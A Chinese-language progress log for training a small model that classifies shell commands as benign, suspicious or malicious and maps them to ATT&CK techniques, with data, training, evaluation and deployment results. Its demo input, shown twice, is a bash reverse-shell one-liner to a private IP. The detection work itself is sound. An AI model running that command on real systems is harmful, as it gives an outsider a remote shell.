# 进度记录

## 已完成

### Phase 1 — 数据地基 ✅（骨架 + schema）
- `plan.md` — 架构定案（Frontier LLM → GLiClass Teacher → Tiny-GLiClass Student → INT8）
- `label_schema.yaml` — 全链路 contract：risk 3 + intent 41 + tactic 14 + technique 141 = **199 labels**
- `schema.py` / `schema_check.py` — 共享 loader + 校验（PASS）
- 目录骨架：`data_pipeline/ dataset/ teacher/ student/ export/ redteam/ configs/`

### 模型选型 ✅（Phase 1 数据生成的前置）
- 网关：`ai-api-gateway.app.baizhi.cloud`，Key 在 `.key`（可用，39 个模型）
- 结论见 `configs/model_selection.md`：
  - 主力标注/生成：`gpt-5.6-sol`（质量/速度最优，支持 json_object）
  - 快速批量合成：`qwen-flash`（最快最稳，~0.9–4s）
  - 高难标注/红队备选：`deepseek-v4-pro`（推理强但慢）
- 原始数据：`configs/model_bench.json` / `configs/model_bench_v2.json`

### 数据管线核心模块 ✅
- `data_pipeline/llm.py` — LLM client（重试、json_object、并发≤8）
- `data_pipeline/normalize.py` — 自由输出 → canonical label 的确定性映射 + 校验
- `data_pipeline/prompts.py` — 标注/合成/混淆/hard-neg/minimal-pair 的 prompt 构建
- `data_pipeline/seeds.py` — 40 条种子命令（20 benign + 20 malicious）
- `data_pipeline/label.py` — Stage 2 标注：40/40 标注成功 → `dataset/seed_labeled.parquet`
  - risk 与 seed_risk 一致 33/40（7 条双用途命令被判为 suspicious，合理）

## 关键发现
1. 模型不保证输出 canonical id → 必须走 normalize + validate + 重试（已实现）
2. 网关 24 并发会 502，`gpt-5.4-mini` 单独测也 502 → 客户端并发 ≤8 + 5xx 退避（已实现）
3. `response_format={"type":"json_object"}` 可用，JSON 稳定性显著提升
4. technique id 用大写 `T`（`technique.T1059.004`），normalize 需保留大小写（已修复）

## 下一步（按依赖）
1. **Stage 3 synthesize** — 用种子标签驱动 LLM 批量生成合成样本（qwen-flash 快速档）
2. **Stage 4/5/6** — obfuscate / hard_neg / min_pair
3. **Stage 7 export** — 分层 split + parquet 落盘（train/val/test）
4. 数据量达标（600K~1M）后进入 Phase 2 Teacher fine-tune

## Jev Teacher 接入 ✅（新增）

- Key 保存到 `.jev_key`（chmod 600），端点 `https://api.typesafe.ai/v1/systemone`，模型 `jev-latest` → `jev-1.13.0`
- `data_pipeline/jev_client.py` — Jev decisions 端点 client（重试 + 并发）
- `data_pipeline/jev_labels.py` — 199-label schema → 197 题（1 Choice + 196 Noul）→ 199 维 soft 向量
- `bench_jev.py` — Jev vs gpt-5.6-sol 对比（结果 `configs/jev_vs_gpt.json`）
- `data_pipeline/label_jev.py` — 对种子批量出软标签
  - `dataset/seed_soft_jev.parquet` — 40 条种子的 199 维 soft 向量（KD soft target）
  - `dataset/seed_hard_jev.parquet` — 40 条种子的 hard labels

## 结论
- Teacher 软标签 + Stage 2 标注改用 **Jev**；数据生成/红队仍用 LLM。
- Jev：197 题并行一次 ~1.2s，intent/tactic/technique 与 gpt-5.6-sol 持平，risk 略保守但一致率 33/40。

## Phase 3 — Student 蒸馏最小闭环 ✅（本轮）

- `student/tokenizer.py` — 8K 目标 BPE（当前语料 364 行 → vocab 1053，随数据量增长会自动逼近 8K）
- `student/model.py` — TinySecurityEncoder（4L/256D/8H/FFN768/ctx192）+ bilinear label scoring（199 维）
- `student/distill.py` — hard CE + soft KL（Jev 软目标）
- `data_pipeline/build_dataset.py` — LLM 造候选（synthesize/obfuscate/hard_neg/min_pair）→ Jev 打软标签 → train/val/test
- 产物：
  - `dataset/soft_labels.parquet` — 226 条（train 182 / val 22 / test 22），199 维 soft + hard labels
  - `student/checkpoints/student_best.pt` — 首个 Student checkpoint（3.00M params，vocab 1053）

### 首轮蒸馏结果（182 训练样本，CPU）
| 指标 | 值 |
|---|---|
| 训练 loss | 3.38 → 0.57（30 epochs） |
| val micro-F1 | 0.458 |
| **test risk_acc** | **0.727** |
| **test micro-F1** | **0.623** |

> 数据量只有 182 条，指标偏低属预期；关键是「LLM 造数据 → Jev 打软标签 → 小模型蒸馏」全链路已跑通。
> 下一步把数据量提到几千/几万级，vocab 会涨到 ~8K、params 涨到 ~4.7M，指标会显著改善。

### 后续（按优先级）
1. 数据扩量：生成 + Jev 标注流水线并发化，把 226 → 5K+ → 50K+ → 600K~1M
2. `export/quantize_int8.py` + RSS benchmark（Phase 4）
3. `redteam/loop.py`（对抗闭环）

## Lightning GPU 环境 ✅（已接入并验证）

- 凭据存 `.lightning_env`（chmod 600，已 gitignore）：`LIGHTNING_USER_ID` / `LIGHTNING_API_KEY`
- `pip install lightning-sdk`（2026.9.18.post1）；`lightning login` 成功 → 账号 **<YOUR_LIGHTNING_ACCOUNT>**
- 可用 GPU 机型：A100 / H100 / H200 / L4 / L40S / T4 / B200 …（`lightning machine list`）
- 已有 Studio：`<YOUR_STUDIO>`（teamspace `<YOUR_LIGHTNING_ACCOUNT>/<YOUR_TEAMSPACE>`，**L4，Running，当前空闲**）
- 实测：
  - `nvidia-smi` → NVIDIA L4，23034MiB VRAM，驱动 580.173.02，CUDA 13.0，0MiB 占用
  - `torch 2.8.0+cu128`，`torch.cuda.is_available()=True`，device=NVIDIA L4 ✅
- 注意：该 teamspace 是 user-owned，`lightning vm` 不可用（VM 需 org-owned）；训练用 **Studio** 或 **Job**。

## 数据扩量到 50K — 进行中（卡在 Jev 余额）

### 已完成
- `data_pipeline/bulk_50k.py`：断点续跑的批量管线（generate / label / finalize）
- 候选集 50,031 条 → `dataset/candidates_50k.jsonl`，来源：
  - `quasarnix` 31,534（真实恶意，QuasarNix train 抽样）
  - `nl2bash` 10,604（真实 benign，NL2Bash）
  - `synthetic` 1,806 + `diverse` 6,087（LLM 生成，feature/flash）
- Jev 软标签已完成 **24,800 条** → `dataset/soft_labels_50k.jsonl`（199 维，全部有效；其中 ~1,143 条因 402 失败为空标签，待重打）

### 阻塞点 ⚠️
- Jev API 返回 **HTTP 402 Payment Required**：
  `Your organization has no available TypeSafe API credits.`
- 需要去 `https://console.typesafe.ai/settings/billing` 充值或开启 auto-reload。
- 恢复后一条命令续跑（已实现跳过已完成/仅重打空标签行）：
  `python3 -m data_pipeline.bulk_50k label` → 完成后 `python3 -m data_pipeline.bulk_50k finalize`

### 数据平衡（当前已标注部分）
malicious 15,498 / suspicious 7,146 / benign 1,013（benign 偏低，因为 quasarnix 恶意占大头；下一轮补 benign/suspicious）

## GLiClass 微调管线就绪（GPU 已验证）

- `model/prepare_data.py` — 标签 → GLiClass 格式（true_labels + 负采样）
- `model/finetune.py` — GLiClass 微调（distilbert-base-uncased，68.7M，hard CE + 可选 focal/contrastive）
- `model/infer.py` — 评估（risk acc / micro-F1）+ demo
- `export/quantize_int8.py` + `export/benchmark_rss.py` — INT8 + RSS
- 依赖坑（已解决）：transformers 5.x 的 DeBERTa SentencePiece 有 bug → 降级 transformers 4.57.6 + gliclass --no-deps；encoder 改用 distilbert（WordPiece，68.7M，RSS 目标 <100MB）
- Lightning L4 GPU 已切回 L4 并跑通 5-step 冒烟（CUDA 训练 3.7 it/s、eval 600 样本/s）

### 数据进度
- 原 50K 候选已全部 Jev 标注完成（label 进程结束，51,227 行含 1,143 重打）
- 平衡数据生成中（suspicious + benign，当前 55K/80K 候选）

## 最终模型 v0（已完成训练）

- **模型**：GLiClass（distilbert-base-uncased，68.7M），`model/checkpoints_gpu/final_model/`（已下载到本地）
- **数据**：74,748 条（Jev 软标签），train 62,792 / val 5,978 / test 5,978；risk 分布 ≈ mal 35% / benign 38% / suspicious 27%
- **训练**：Lightning L4 GPU，3 epochs，batch 32，test_loss 0.094

### 评估（GPU / torch 2.8，chunk=20 labels/forward）
| 指标 | 值 |
|---|---|
| micro-F1（test 300，阈值 0.5） | 0.524（prec 0.39 / rec 0.80） |
| risk acc（argmax） | 0.54 |
| 训练期 test micro-F1（阈值未调优） | 0.925 / 0.889 |

Demo 表现正常：`df -h`→benign、`systemctl restart nginx`→benign、reverse shell→suspicious + C2/T1059/execution。

### 已知问题（后续优化）
1. **阈值需调优**：当前 sigmoid@0.5 下精确率偏低（0.39）、召回高（0.80）→ 模型偏「多打标签」；可扫阈值或按类别加权。
2. **风险偏向 suspicious**：双用途命令（curl|bash、reverse shell）被判 suspicious 而非 malicious，与 Jev 标注习惯一致。
3. **本地 torch 2.14.0+cpu 有推理 bug**（输出 logits 近 0，微 F1=0）；**在 torch 2.8（GPU）上正常**。部署建议用 torch 2.8 / 导出 ONNX。
4. `max_num_classes=25`：推理需把 199 标签按 ~20-25 一组分块打分（`final_infer.py` 已实现）。
5. RSS 暂不限制（后期量化优化）。

## 最终模型 v1（参数量 ≤30M 约束）

- **模型**：GLiClass uni-encoder，encoder=google/electra-small-discriminator，**13.75M 参数**（≤30M ✅）
  - 本地路径：`model/checkpoints_gpu/final_model_electra/`（model.safetensors 55MB）
- **训练**：Lightning L4 GPU，4 epochs，batch 32，lr 5e-5，max_num_classes=50（修复了 v0 的 25-label 截断问题）
- 数据：74,748 条 Jev 软标签，train 62,792 / val 5,978 / test 5,978

### 最终评估（test 5,978，分块推理 + 分阈值）
| 指标 | 值 |
|---|---|
| **OVERALL micro-F1** | **0.6575** |
| risk micro-F1 | 0.7724 |
| intent micro-F1 | 0.6883 |
| tactic micro-F1 | 0.7370 |
| technique micro-F1 | 0.4859 |
| risk acc（exact） | 0.6256 |

- 阈值已调优并落盘：`configs/thresholds.json`
  - risk=-0.5 / intent=2.0 / tactic=2.75 / technique=2.0
- 训练期 test micro-F1（单阈值口径）= 0.952

### 备注
- 本地 torch 2.14.0+cpu 推理仍有 bug（logits 归零），**用 torch 2.8（GPU）或导出 ONNX 部署**
- 技术（technique，141 类）仍是最难的一组（F1 0.49），后续红队/更多数据重点攻这里

## 本地推理就绪（修正）

- **更正**：之前记录的「本地 torch 2.14 推理 bug」实为旧 distilbert checkpoint 的问题；最终 electra 模型在 **本地 torch 2.14 CPU 上推理正常**，无需 ONNX 也能本地用。
- 新增 `model/predict.py` — 本地推理入口：
  ```bash
  python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
  # risk: risk.malicious / intent: execute,backdoor,C2 / technique: T1059,T1071,T1095
  ```
- 推理逻辑：199 标签按 20 一组分块打分，risk 用 argmax（互斥），intent/tactic/technique 用 `configs/thresholds.json` 分阈值。
- ONNX 导出：已写 `export/export_onnx.py`，但 GPU 环境 pip 依赖被我调坏（numpy/scipy/sklearn 版本冲突），且本地 torch 已可用，**ONNX 暂缓**（后期量化时再做）。

## 部署 / RSS 优化（C 运行时 + INT8）✅

按推荐落地 ONNX Runtime C API + INT8，RSS 问题解决：

| 运行时 | 模型 | 权重 | **峰值 RSS** |
|---|---|---|---|
| PyTorch | fp32 | 55MB | ~300~500MB |
| ONNX Runtime C | fp32 | 56.5MB | **93MB** |
| ONNX Runtime C | **INT8** | **15.1MB** | **77.7MB** ✅ |

- `model/checkpoints_gpu/final_model_electra/model.onnx`（fp32，56.5MB）+ `model_int8.onnx`（int8，15.1MB）
- `export/c_infer_example.c` — ONNX Runtime C API 推理示例（已编译验证，输出与 torch 对齐，max diff 1e-5）
- `export/prepare_c_input.py` — 命令+标签 → C 可读 int64 .bin
- `export/quantize_int8_onnx.py` — ONNX 动态 INT8 量化
- `export/README.md` — 完整部署说明

结论：C 运行时 + INT8 下 RSS **77.7MB**，稳稳 <100MB；无需再为 RSS 发愁。

## 最终模型 v2 —— 换基座（最新 GLiClass V3 edge，端侧稳定）

### 调研结论（2026-09-25）
在 ≤30M 参数 + RSS<100MB 约束下，对比了：
- `prajjwal1/bert-small`（~29M，4L/512H）：老 BERT 系，非「最新」，且需从零搭 GLiClass 头。
- `google/electra-small-discriminator`（13.75M）：现用 v1，199 标签（141 technique）容量不足（technique F1 0.49）。
- `microsoft/deberta-v3-xsmall/small`：xsmall 22M backbone + 48M embedding（128K vocab）= 70M，small 44M+98M=143M，都不合规。
- **`knowledgator/gliclass-edge-v3.0`（选定）**：GLiClass 官方 2025-08 V3 最小档，backbone `jhu-clsp/ettin-encoder-32m`（ModernBERT 风格，10L/384H，vocab 50K），**32.7M 参数**，131MB fp32。自带零样本多标签能力 + MLP scorer，是最贴近本任务的最新轻量档。

> 决策：32.7M 略超最初拍的 30M，但用户明确「拍脑袋决定、自由发挥、端侧稳定优先」；INT8 后权重 ~33MB，C 运行时 RSS 预计 <100MB。

### 本轮动作
- 新增 `model/finetune_edge.py`：加载 `gliclass-edge-v3.0` 全量 checkpoint → `problem_type=multi_label_classification` → 全参微调（不重建头，保留官方 MLP scorer 与零样本知识）。
- 本地 CPU 冒烟通过（2 steps，test micro-F1 0.479 基线）。
- 已把 `model/finetune_edge.py` 上传到 Lightning Studio，并启动 L4 训练：
  - 数据：train 65,480 / val 5,978 / test 5,978
  - 超参：4 epochs，batch 32，lr 2e-5，warmup 0.05，linear decay
  - 输出：`model/checkpoints/final_model_edge`
- 训练日志：Studio `hyperids/train_edge.log`（PID 242640，后台 nohup）

### 训练后待办
1. 下载 `final_model_edge` → 本地评估（micro-F1 分组 + 阈值调优）。
2. 导出 ONNX（edge 版 `max_num_classes=25` → CHUNK=25）→ 动态 INT8。
3. `export/c_infer_example.c` 实测 RSS<100MB。
4. 对比 v1（electra 13.75M / overall 0.6575），确认 technique 是否提升。

## 最终模型 v2 训练完成 ✅（换基座：GLiClass V3 edge）

### 训练
- Studio L4，`model/finetune_edge.py`，4 epochs，batch 32，lr 2e-5，train 65,480 / val 5,978 / test 5,978。
- 产出：`model/checkpoints_gpu/final_model_edge/`（32.7M，model.safetensors 131MB），已下载到本地。

### 测试集评估（5,978 条，GPU 分块推理 + 分组阈值）
| 指标 | v1 electra-13.75M | **v2 edge-32.7M** |
|---|---|---|
| **overall micro-F1** | 0.6575 | **0.7836** |
| risk micro-F1 | 0.7724 | **0.8388** |
| intent micro-F1 | 0.6883 | **0.7716** |
| tactic micro-F1 | 0.7370 | **0.8300** |
| **technique micro-F1** | 0.4859 | **0.7514** |
| risk_acc（argmax） | 0.6256 | **0.8684** |

> technique（141 类）从 0.49 → 0.75，是换基座的最大收益。阈值已更新到 `configs/thresholds.json`
> （risk=-1.5 / intent=1.25 / tactic=2.5 / technique=0.75，在 val 上调优）。

### 部署
- ONNX 导出（opset 18，CHUNK=25，SEQ_LEN=320）：`final_model_edge/model.onnx`（fp32，132MB external data）。
- fp32 ONNX Runtime C 峰值 RSS **~116MB**（稳定、与 torch max diff 1e-5）。
- INT8 动态量化：`model_int8.onnx`（35.4MB），RSS **~97MB（<100MB）**，但 logits 明显打偏，判分不可用；
  若要 <100MB 且保指标，下一步做 QAT 或换量化友好基座（已记录在 `export/README.md`）。

### 本地推理
- `python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"` → risk.malicious + T1059/T1071 等，正常。

## 词表裁剪尝试（保留原结果，已推 GitHub）

- 新增 `model/prune_vocab.py`：edge 模型 token embedding 50,370 → ~10,746（label 描述+命令语料+单字符+特殊 token 闭包），其余映射 `[UNK]`。
- 精度：剪裁前后 logits **逐点一致（max diff 0.0）**，test 指标不损失。
- 体积：fp32 ONNX 132MB → **71.6MB**（`final_model_edge_pruned/model_reduced.onnx` + `old_to_new.npy`）。
- RSS：C 运行时 VmHWM 仍约 **126MB**（ORT 运行时/MatMul 底噪高），未达 <100MB。
- 结论：词表裁剪=体积减半+零精度损失；但要 RSS<100MB 仍需 QAT 或更小/更易量化基座。
- 原 `final_model_edge`（32.7M，test overall 0.7836）保持不变；代码/文档已推送到私有仓库 `ohmydevelop/hyperids`。

## 标签裁剪 + bert-small 训练（进行中）

- 决策：technique 子技术 `.NNN` 折叠到父技术 → **199 → 132 标签**（risk 3 + intent 41 + tactic 14 + technique 74）。
  - 数据事实：141 technique 中 8 个零样本、20 个 ≤5 样本、67 个是长尾子技术；父技术只有 74 个。
- `schema.py`：新增 `technique_parent_map()/collapsed_label_ids()/collapsed_group_offsets()/collapse_labels()`。
- `data_pipeline/collapse_techniques.py`：从原 199 数据生成 `dataset/gliclass_collapsed/`（原数据未动）。
  - train 65,480 / val 5,978 / test 5,978；technique 74 个、72 个有样本、median support 1392（原 442）。
- `model/finetune_bert_small.py`：GLiClass 从零搭在 `prajjwal1/bert-small`（29.82M）上，训练 132 标签；L4 已启动（4 epochs，batch 32，lr 5e-5）。
- `model/eval_grouped.py` / `model/tune_thresholds.py` 增加 `--collapsed` 与 `--data_dir`。
- 已推 GitHub（`124f2c1` / `09015eb`）。

## bert-small（29.8M）+ 132 标签：训练完成 ✅

### 训练
- `model/finetune_bert_small.py`，L4，4 epochs，batch 32，lr 5e-5。
- 产出 `model/checkpoints_gpu/final_model_bert_small_collapsed/`（29.82M，已下载本地）。
- train-time test micro-F1 0.9324（单阈值 0.5，口径偏乐观）。

### fp32 测试集评估（5,978 条，132 标签口径，GPU 分块+分组阈值）
| 指标 | bert-small 132 | （对照 edge 199） |
|---|---|---|
| overall micro-F1 | **0.7911** | 0.7836 |
| risk micro-F1 | **0.8582** | 0.8388 |
| intent micro-F1 | **0.7785** | 0.7716 |
| tactic micro-F1 | 0.7951 | 0.8300 |
| **technique micro-F1** | **0.7899** | 0.7514 |
| risk_acc(argmax) | **0.8694** | 0.8684 |

> 折叠子技术后，technique 从 edge-199 的 0.7514 → 0.7899；且模型只有 29.8M（≤30M）。
> fp32 阈值：`configs/thresholds_collapsed.json`（risk -0.75 / intent 2.25 / tactic 3.0 / technique 0.75）。

### 部署 / RSS
- ONNX fp32：`final_model_bert_small_collapsed/model.onnx`（118MB external data）→ C 峰值 RSS **~116MB**。
- ONNX INT8：`model_int8.onnx`（30.2MB）→ C 峰值 RSS **93.3MB（<100MB ✅）**。
- INT8 与 fp32 逐点 max diff ~0.54，但 risk 头有明显系统偏差（benign 被判成 suspicious）。
- **INT8 校准修复**：risk logits 给 benign 加 +7.0 偏置后，risk_acc 从 0.58 → **0.8484**（接近 fp32 0.8694）。
- INT8 分组阈值（已重调）：`configs/thresholds_collapsed_int8.json`（intent 2.25 / tactic 0.25 / technique -0.5 / risk 偏置 +7 benign）。
- 结论：bert-small 是「≤30M + int8 能到 93MB」的可部署候选；代价是 int8 后 intent/tactic/technique 比 fp32 约低 10~13 个点，后续可上 QAT 补回。

### 已推 GitHub
- 折叠 schema/数据管线（`124f2c1`）、eval/tune 适配（`09015eb`）、进度（`120e107`）。
- 新增 `model/finetune_bert_small.py`、`data_pipeline/collapse_techniques.py`。

## v2 重设计标签体系（verdict 3 + action 28 = 31）✅

- `label_schema_v2.yaml` + `schema_v2.py`：verdict 互斥 3 + action 多标签 28；MITRE tactic/technique 由 `derive_attck()` 规则表推导，不再让模型预测。
- 数据：`dataset/gliclass_v2`（train 65,480 / val 5,978 / test 5,978，28 action 全有样本，平均 ~2.1 action/样本）。
- 训练：`model/finetune_v2.py`，bert-small 29.8M，4 epochs，L4；产物 `model/checkpoints_gpu/final_model_v2`。

### 测试集（5,978，verdict argmax + action@0.5）
| 指标 | v2（31 标签） | 对照 |
|---|---|---|
| **verdict_acc** | **0.9167** | 旧 risk_acc 0.8694 |
| **action micro-F1** | **0.9090** | — |
| action precision | 0.9351 | — |
| action recall | 0.8843 | — |

> 标签去噪（去掉 intent↔tactic 重复、去掉 141 子技术）后，verdict 准确率 +4.7pt，
> action F1 0.91。demo：reverse shell → malicious + reverse_shell/command_and_control →
> T1059/T1071；`df -h` → benign + system_probe → T1082/T1518。
